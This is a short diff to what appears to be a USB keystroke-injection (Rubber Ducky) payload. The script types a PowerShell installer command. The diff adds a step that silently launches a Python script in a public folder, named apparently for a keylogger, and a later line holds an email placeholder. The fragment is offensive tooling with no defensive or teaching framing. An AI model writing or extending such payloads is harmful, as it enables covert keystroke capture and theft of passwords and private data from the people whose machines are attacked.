@@ -20,6 +20,8 @@ ENTER
 REM --> runs ps1 file
 DELAY 54000
 STRING ./install_python.ps1 "parameter title"
+DELAY 54000
+STRING pythonw 'C:\Users\Public\pythonkl.py'
 ENTER
 DELAY 54000
 STRING emailhere
